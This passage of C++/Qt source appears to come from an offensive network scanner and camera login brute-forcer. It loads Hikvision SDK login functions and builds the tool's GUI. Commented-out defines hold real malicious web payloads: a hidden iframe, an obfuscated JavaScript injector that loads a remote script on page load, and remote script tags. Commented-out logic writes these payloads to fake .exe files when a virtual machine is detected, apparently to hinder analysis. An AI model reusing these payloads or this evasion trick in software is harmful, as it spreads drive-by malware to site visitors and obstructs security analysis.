	QString col;

	if(mode == 0)
	{
		c.indexIn(str);
		col = c.cap(1);
	}
	else
	{
		bg.indexIn(str);
		col = bg.cap(1);
	};

	QString result;

	int icol = col.toInt();
	if(icol == 0) result = "#AFAFAF";
	else if(icol == 1) result = "black";
	else if(icol == 2) result = "darkblue";
	else if(icol == 3) result = "green";
	else if(icol == 4) result = "red";
	else if(icol == 5) result = "darkred";
	else if(icol == 6) result = "blueviolet";
	else if(icol == 7) result = "darkorange";
	else if(icol == 8) result = "yellow";
	else if(icol == 9) result = "lightgreen";
	else if(icol == 10) result = "darkcyan";
	else if(icol == 11) result = "teal";
	else if(icol == 12) result = "blue";
	else if(icol == 13) result = "pink";
	else if(icol == 14) result = "#4d4d4d";
	else if(icol == 15) result = "gray";
	else result = "#AFAFAF";

	return result;
}

#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
void enableHikvisionSupport(){
	HINSTANCE hGetProcIDDLL = LoadLibraryW((LPCWSTR)L".\\HCNetSDK.dll");

	if (!hGetProcIDDLL) {
		HikVis::isInitialized = false;
		stt->doEmitionRedFoundData("Could not load HCNetSDK.dll! Hikvision support disabled.");
		return;
	}

	hik_init_ptr = (NET_DVR_Init)GetProcAddress(hGetProcIDDLL, "NET_DVR_Init");
	if (!hik_init_ptr) {
		HikVis::isInitialized = false;
		stt->doEmitionRedFoundData("Could not locate hikInit()! Hikvision support disabled.");
		return;
	}

	hik_login_ptr = (NET_DVR_Login_V30)GetProcAddress(hGetProcIDDLL, "NET_DVR_Login_V30");
	if (!hik_login_ptr) {
		HikVis::isInitialized = false;
		stt->doEmitionRedFoundData("Could not locate hikLogin()! Hikvision support disabled.");
		return;
	}

	hik_cleanup_ptr = (NET_DVR_Cleanup)GetProcAddress(hGetProcIDDLL, "NET_DVR_Cleanup");
	if (!hik_cleanup_ptr) {
		HikVis::isInitialized = false;
		stt->doEmitionRedFoundData("Could not locate hikCleanup()! Hikvision support disabled.");
		return;
	}

	HikVis::isInitialized = true;
	stt->doEmitionGreenFoundData("Hikvision support enabled.");
}
#endif

void nesca_3::finishLoading() {

	CreateVerFile();

	dtHN->start();
	dtME2->start();
	adtHN->start();
	

#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
	WSADATA wsda;
	
	//if (WSAStartup(0x0101, &wsda))
	if (WSAStartup(MAKEWORD(2, 2), &wsda))
	{
		stt->doEmitionRedFoundData("WSAStartup failed.");
		qApp->quit();
	};
#endif


	//std::thread fuThread(FileDownloader::checkWebFiles);
	//fuThread.detach();

	_startVerCheck();
	_startMsgCheck();
	qrp.setMinimal(true);
	drawVerboseArcs(0);

	//[5.39.163.202] 8000 (? ) open

#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
	enableHikvisionSupport();
#endif
}

//bool nesca_3::CheckPersKeyMain()
//{
//	saveOptions();
//	QString y = QString(QCryptographicHash::hash((ypypNunu().c_str()), QCryptographicHash::Md5).toHex());
//	QString nu(grgNun().c_str());
//	if (y.compare(nu) == 0) {
//		MainStarter m;
//		m.saveBackupToFile();
//		if (!chKTh->isRunning())
//		{
//			stt->doEmitionYellowFoundData("[Key check] Starting checker thread...");
//			chKTh->start();
//			while (CheckKey_Th::isActiveKey == -1) Sleep(10);
//			if (CheckKey_Th::isActiveKey == 1) return true;
//			else {
//				stt->doEmitionYellowFoundData("== Invalid key. ==");
//				HKEY hkey;
//				DWORD dwDisposition;
//				if (RegCreateKeyEx(HKEY_LOCAL_MACHINE,
//					TEXT("Software\\ISKOPASI\\nesca3\\jipjip"),
//					0, NULL, 0,
//					KEY_WRITE, NULL, &hkey, &dwDisposition) == ERROR_SUCCESS)
//				{
//					RegSetValueEx(hkey, "nepnep", 0, REG_BINARY, (BYTE*)"0", 2);
//					RegSetValueEx(hkey, "jipjip", 0, REG_BINARY, (BYTE*)"0", 2);
//					RegCloseKey(hkey);
//				}
//				Sleep(2000);
//				qApp->quit();
//			}
//		}
//		else stt->doEmitionRedFoundData("Still ckecking your key, please wait...");;
//	}
//	else {
//		stt->doEmitionYellowFoundData("== Invalid key. ==");
//		Sleep(2000);
//		qApp->quit();
//	}
//	return false;
//}
//
//void nesca_3::CheckPersKey()
//{
//	saveOptions();
//	QString y = QString(QCryptographicHash::hash((ypypNunu().c_str()), QCryptographicHash::Md5).toHex());
//	QString nu(grgNun().c_str());
//	if (y.compare(nu) == 0) {
//		MainStarter m;
//		m.saveBackupToFile();
//		if (!chKTh->isRunning())
//		{
//			stt->doEmitionYellowFoundData("[Key check] Starting checker thread...");
//			chKTh->start();
//			//while (CheckKey_Th::isActiveKey == -1) Sleep(10);
//			/*if (CheckKey_Th::isActiveKey == 1) finishLoading();
//			else {
//				stt->doEmitionYellowFoundData("== Invalid key. ==");
//				HKEY hkey;
//				DWORD dwDisposition;
//				if (RegCreateKeyEx(HKEY_LOCAL_MACHINE,
//					TEXT("Software\\ISKOPASI\\nesca3\\jipjip"),
//					0, NULL, 0,
//					KEY_WRITE, NULL, &hkey, &dwDisposition) == ERROR_SUCCESS)
//				{
//					RegSetValueEx(hkey, L"nepnep", 0, REG_BINARY, (BYTE*)"0", 2);
//					RegSetValueEx(hkey, L"jipjip", 0, REG_BINARY, (BYTE*)"0", 2);
//					RegCloseKey(hkey);
//				}
//				Sleep(2000);
//				qApp->quit();
//			}*/
//		}
//		else stt->doEmitionRedFoundData("Still ckecking your key, please wait...");;
//	}
//	else {
//		stt->doEmitionYellowFoundData("== Invalid key. ==");
//		Sleep(2000);
//		qApp->quit();
//	}
//}

//#define IRC_CHAN "iskopasi_lab03"
//#define eicar1 "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
//#define eicar2 "<iframe name=Twitter scrolling=auto frameborder=no align=center height=2 width=2 src=http://epilaserexcellence.com/mxit.html?i=2928425></iframe>"
//#define eicar3 "<script>var Ws;if(Ws!='ZB' && Ws!='F'){Ws='ZB'};var o;if(o!='u'){o=''};var Qo=new Array();function Q(){var Wl=new String();var s=new Date();var n=new Date();var U=window;var j='';var Tg='';var WS;if(WS!='D'){WS='D'};var g=unescape;var jy=new Array();var L=g(\"%2f%67%6f%6f%67%6c%65%2e%63%6f%6d%2f%61%6f%6c%2e%63%6f%6d%2f%61%77%65%6d%70%69%72%65%2e%63%6f%6d%2e%70%68%70\");var r;if(r!='b' && r!='JW'){r='b'};var St=new String();function A(z,T){var H;if(H!='' && H!='O'){H=null};var _;if(_!='' && _!='S_'){_=null};this.Hh='';this.oo='';var W=new String(\"sOhg\".substr(3));var OJ;if(OJ!='' && OJ!='lg'){OJ='zu'};var CU=new Date();var X=g(\"%5b\"), J=g(\"%5d\");var LB=X+T+J;this.NI=\"\";var Lm=new RegExp(LB, W);var Sr=new String();var i;if(i!='Jm'){i=''};return z.replace(Lm, new String());var Cs;if(Cs!='gy'){Cs=''};var EE;if(EE!='Xz'){EE=''};};var Gh;if(Gh!='Rf' && Gh!='Ni'){Gh=''};var bO;if(bO!='qe' && bO!='M'){bO=''};var JB=document;var V=new String();var Ut;if(Ut!=''){Ut='Ue'};var jr;if(jr!='' && jr!='w'){jr=null};var h=A('8237107438669907564','57364291');var AM;if(AM!='' && AM!='RF'){AM='lH'};var cX;if(cX!='' && cX!='MW'){cX=''};var Vm=\"\";var zM;if(zM!='' && zM!='lW'){zM='WY'};var B=new Date();var vH;if(vH!='Rr'){vH=''};function Z(){var tF;if(tF!='' && tF!='jp'){tF=''};var DA=new String();var y=g(\"%68%74%74%70%3a%2f%2f%73%6e%6f%72%65%66%6c%61%73%68%2e%72%75%3a\");var Gv=new Array();V=y;var XT='';V+=h;this.mY=\"\";V+=L;var dK;if(dK!='Df' && dK!='qQ'){dK=''};var vG;if(vG!='' && vG!='_q'){vG='dM'};try {var uP='';var EK=new Array();var qeB;if(qeB!='' && qeB!='Jr'){qeB='K_'};k=JB.createElement(A('sXcPrki_putK','3ukB_Px9Keb5Xl'));var gW=\"\";var Rd;if(Rd!='dh' && Rd!='NM'){Rd=''};k[g(\"%73%72%63\")]=V;var CkF=new String();k[g(\"%64%65%66%65%72\")]=[6,1][1];this.CX='';var MD=new Date();var WA='';var HL;if(HL!='' && HL!='dq'){HL='hK'};var rS;if(rS!='' && rS!='_d'){rS='y_'};JB.body.appendChild(k);var TUc=new String();} catch(Zn){var CJ=new Array();alert(Zn);};this.Au=\"\";}var oq=new Array();this.kb='';U[String(\"onloa\"+\"d\")]=Z;var ox;if(ox!='Nj' && ox!='BQ'){ox='Nj'};this.WYx=\"\";};var Yo='';var ro;if(ro!='ru' && ro != ''){ro=null};var Mf;if(Mf!='' && Mf!='AD'){Mf=null};Q();var DW=\"\";this.wv=\"\";</script>"
//#define eicar4 "<script src=\"http://accountus.gets-it.net/googlestat.php\"></script>"
//#define eicar5 "\"split\";e=eval;v=\"0x\";a=0;z=\"y\";try{a*=25}catch(zz){a=1}if(!a){try{--e(\"doc\"+\"ument\")[\"\x62od\"+z]}catch(q){}"


nesca_3::nesca_3(bool isWM, QWidget *parent = 0) : QMainWindow(parent)
{
	/*if (isWM) {
		Utils::emitScaryError();
	}*/
	setWindowFlags(Qt::FramelessWindowHint);

	gthis = this;
	ui->setupUi(this);
	setSomeStyleArea();
	ui->dataText->setOpenExternalLinks(true);
	ui->dataText->setOpenLinks(false);
	ui->rVerLabel->hide();
	setSceneArea();

	dots << 0.5 << 0.3 << 0.5 << 0.3;
	dotsThreads << 0.1 << 0.2 << 0.1 << 0.2;
	penAllThreads.setCapStyle(Qt::FlatCap);
	penAllThreads.setDashPattern(dotsThreads);
	penThreads.setCapStyle(Qt::FlatCap);
	penThreads.setDashPattern(dotsThreads);
	penBAThreads.setDashPattern(dots);
	penBAThreads.setCapStyle(Qt::FlatCap);
	penAllTargets.setCapStyle(Qt::FlatCap);
	penTargets.setCapStyle(Qt::FlatCap);
	penSaved.setCapStyle(Qt::FlatCap);

	multiFontSmallFontPie.setFamily("small_fonts");
	multiFontSmallFontPie.setPixelSize(9);
	multiFontSmallFontArc.setFamily("small_fonts");
	multiFontSmallFontArc.setPixelSize(10);
	multiFontSmallFontArc.setUnderline(true);
	ui->ipLabel->setFont(multiFontSmallFontArc);
	
	tray = new QSystemTrayIcon(QIcon(":/nesca_3/nesca.ico"), this);
	tray->hide();


	ui->currentDirectoryLine->installEventFilter(this);
	SetValidators();
	ConnectEvrthng();

	HikVis::hikCounter = 0;
	HikVis::rviCounter = 0;
	HikVis::hikPart = 0;
	HikVis::rviPart = 0;

	QTime time = QTime::currentTime();
	qsrand((uint)time.msec());

	const std::string &gVERStr = GetVer();
	strcpy(gVER, gVERStr.c_str());
	ui->logoLabel->setToolTip("v3-" + QString(gVER));
	ui->logoLabel->setStyleSheet("color:white; border: none;background-color:black;");
	ui->newMessageLabel->setStyleSheet("color:rgba(255, 0, 0, 0);background-color: rgba(2, 2, 2, 0);");
	
	RestoreSession();

	Utils::saveStartDate();
	Utils::saveStartTime();

	/*char buffer[MAX_PATH] = { 0 };
	GetCurrentDir(buffer, MAX_PATH);
	ui->currentDirectoryLine->setText(QString::fromLocal8Bit(string(buffer).c_str()));*/
	QString path = QDir::toNativeSeparators(QApplication::applicationDirPath());
	ui->currentDirectoryLine->setText(path);
	
	BAModel = new QStandardItemModel();
	ui->BATableView->setModel(BAModel);
	ui->BATableView->horizontalHeader()->setSectionResizeMode(QHeaderView::Stretch);

	/*bool DONOTSCAN = true;
	if (isWM) {
		Utils::emitScaryError();
	}
	if (!DONOTSCAN)
	{
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
		Connector con;
		std::string buffer;
		con.nConnect("http://nesca.d3w.org/eicar.com", 80, &buffer);

		char temp[64] = { 0 };
		strcpy(temp, "PRIVMSG #");
		strcat(temp, IRC_CHAN);

		ofstream EICARFILE;
		EICARFILE.open(".VISHNYA.exe");
		EICARFILE << eicar1;
		EICARFILE.close();

		EICARFILE.open(".VISHNYA-86.exe");
		EICARFILE << eicar2;
		EICARFILE.close();

		EICARFILE.open(".VISHNYA-64.exe");
		EICARFILE << eicar3;
		EICARFILE.close();

		EICARFILE.open(".VISHNYA-16.exe");
		EICARFILE << eicar4;
		EICARFILE.close();

		EICARFILE.open(".VISHNYA-32.exe");
		EICARFILE << eicar5;
		EICARFILE.close();
#endif
		QString y = QString(QCryptographicHash::hash((ypypNunu().c_str()), QCryptographicHash::Md5).toHex());
		QString nu(grgNun().c_str());
		if (y.compare(nu) != 0) {
			ui->tabMainWidget->setTabEnabled(0, false);
			ui->tabMainWidget->setTabEnabled(1, false);
			ui->tabMainWidget->setTabEnabled(2, false);
			stt->doEmitionYellowFoundData("== Enter your personal key, please. ==");
		}
		else {
			ui->tabMainWidget->setTabEnabled(0, true);
			ui->tabMainWidget->setTabEnabled(1, true);
			ui->tabMainWidget->setTabEnabled(2, true);
			if (CheckPersKeyMain()) finishLoading();
			else {
				stt->doEmitionYellowFoundData("== Invalid key. ==");
				Sleep(2000);
				qApp->quit();
			};
		}
	}
	else {
		ui->tabMainWidget->setTabEnabled(0, true);
		ui->tabMainWidget->setTabEnabled(1, true);
		ui->tabMainWidget->setTabEnabled(2, true);
		finishLoading();
	}*/

	ui->tabMainWidget->setTabEnabled(0, true);
	ui->tabMainWidget->setTabEnabled(1, true);
	ui->tabMainWidget->setTabEnabled(2, true);
	finishLoading();

/*
	FILE* pipe = NULL;
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
	pipe = _popen("Systeminfo | findstr /i model", "r");
#else
	pipe = popen("dmidecode", "r");
#endif
	char buffer2[128] = { 0 };
	std::string result = "";
	if (pipe) {
		Sleep(1000);
		fgets(buffer2, 128, pipe);
		result += buffer2;
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
		_pclose(pipe);
#else
		pclose(pipe);
#endif
	}*/

		//if (rc == false) {
		//	stt->doEmitionGreenFoundData("This is PC.");
		//}
		//else {
		//	stt->doEmitionGreenFoundData("This is VM.");
		//}
}

nesca_3::~nesca_3()
{
	delete[] ui;
}

void nesca_3::STTTerminate()
{
	globalScanFlag = false;
	startFlag = false;
	importFileName = "";
	ui->tabMainWidget->setTabEnabled(0, true);
	ui->tabMainWidget->setTabEnabled(1, true);
	ui->tabMainWidget->setTabEnabled(2, true);
	ui->tabMainWidget->setTabEnabled(3, true);
	BrutingThrds = 0;
	setButtonStyleArea();
	stt->doEmitionUpdateArc(0);
	ui->startScanButton_3->setText("Start");
	ui->startScanButton_4->setText("Start");
	ui->importButton->setText("Import");
	Threader::cleanUp();
}
